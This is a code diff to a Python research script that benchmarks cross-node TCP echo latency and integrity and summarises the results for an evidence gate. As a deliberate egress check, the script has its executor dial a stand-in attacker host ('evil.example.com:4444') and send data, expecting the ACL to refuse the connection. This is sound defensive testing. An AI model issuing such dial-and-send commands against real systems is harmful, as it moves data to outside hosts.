@@ -13,13 +13,50 @@ import time
 from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
-from neural_pods.native_comm import EgressACL, NativeCommExecutor  # noqa: E402
+from neural_pods.native_comm import EgressACL, NativeCommExecutor
+from research.evidence import write as write_evidence
+
+#: The modules these numbers are evidence ABOUT.
+SUBJECT = ["neural_pods/native_comm.py"]  # noqa: E402
 
 PEER_NODE = "np-node2"
 ECHO_PORT = 45779
 ROUNDS = 30
 
 PEER_CODE = None  # echo server is research/echo_server.py
+
+def percentile(values: list[float], p: float) -> float | None:
+    """None for an empty sample: the gate must be able to tell "fast" from
+    "never measured"."""
+    if not values:
+        return None
+    ordered = sorted(values)
+    return round(ordered[min(len(ordered) - 1, int(len(ordered) * p))], 2)
+
+
+def summarise(*, rounds: int, integrity_ok: int, refused_or_invalid: int,
+              rtts: list[float], forbidden_refused: int,
+              executor_stats: dict | None = None) -> dict:
+    """Turn the observations into the evidence the gate reads. Pure.
+
+    `status` is "completed" only when EVERY round came back byte-identical.
+    A partial run is "degraded" and the gate rejects it — the count alone
+    would otherwise read as a smaller but successful experiment.
+    """
+    return {
+        "status": "completed" if integrity_ok == rounds and rounds > 0 else "degraded",
+        "rounds": rounds,
+        "integrity_ok": integrity_ok,
+        "refused_or_invalid": refused_or_invalid,
+        # The ACL must refuse the forbidden target. `>= 1` rather than a
+        # boolean the caller passes in: the count is the observation.
+        "acl_blocked_forbidden": forbidden_refused >= 1,
+        "acl_refusals": forbidden_refused,
+        "rtt_p50_ms": percentile(rtts, 0.5),
+        "rtt_p99_ms": percentile(rtts, 0.99),
+        "executor_stats": executor_stats or {},
+    }
+
 
 def main() -> None:
     # Start the echo server inside np-node2.
@@ -50,18 +87,14 @@ def main() -> None:
             integrity_ok += 1
             rtts.append(elapsed)
         time.sleep(0.05)
-    rtts.sort()
-    forbidden = executor.execute(f"DIAL evil.example.com:4444\nSEND {base64.b64encode(b'x').decode()}\n")
-    result = {
-        "status": "completed" if integrity_ok == ROUNDS else "degraded",
-        "rounds": ROUNDS, "integrity_ok": integrity_ok,
-        "refused_or_invalid": refused,
-        "acl_blocked_forbidden": forbidden.refused >= 1,
-        "rtt_p50_ms": round(rtts[len(rtts) // 2], 2) if rtts else None,
-        "rtt_p99_ms": round(rtts[int(len(rtts) * 0.99) - 1], 2) if rtts else None,
-    }
-    Path("research/runs/native-tcp-cross-20260920.json").write_text(
-        json.dumps(result, indent=2), encoding="utf-8")
+    forbidden = executor.execute(
+        f"DIAL evil.example.com:4444\nSEND {base64.b64encode(b'x').decode()}\n")
+    result = summarise(rounds=ROUNDS, integrity_ok=integrity_ok,
+                       refused_or_invalid=refused, rtts=rtts,
+                       forbidden_refused=forbidden.refused,
+                       executor_stats=executor.stats())
+    write_evidence(result, Path("research/runs/native-tcp-cross-20260920.json"),
+                   __file__, subject=SUBJECT)
     print(json.dumps(result, indent=2))
 
 
